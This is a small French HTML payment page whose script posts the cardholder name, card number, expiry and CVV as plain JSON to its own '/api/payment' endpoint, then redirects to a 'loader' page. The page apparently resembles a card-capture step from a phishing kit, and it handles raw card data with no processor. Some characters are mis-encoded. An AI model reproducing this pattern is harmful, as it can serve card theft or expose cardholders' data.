<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Paiement</title>
  <style>
    body {font-family: Arial; padding: 50px;}
    form {max-width: 400px; margin: auto;}
    input, button {width:100%; padding:10px; margin:8px 0; border-radius:5px; border:1px solid #ccc;}
    button {background:#28a745; color:white; border:none; cursor:pointer;}
  </style>
</head>
<body>
  <h1>ðŸ’³ Paiement</h1>
  <form onsubmit="sendPayment(event)">
    <input required name="nomTitulaire" placeholder="Nom du titulaire">
    <input required name="cardNumber" placeholder="NumÃ©ro de carte" maxlength="19">
    <input required name="expiry" placeholder="MM/AA" maxlength="5">
    <input required name="cvv" placeholder="CVV" maxlength="3">
    <button type="submit">Payer</button>
  </form>
  <script>
    async function sendPayment(e){
      e.preventDefault();
      const form = Object.fromEntries(new FormData(e.target).entries());
      await fetch('/api/payment', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(form)
      });
      window.location.href = '/loader.html';
    }
  </script>
</body>
</html>
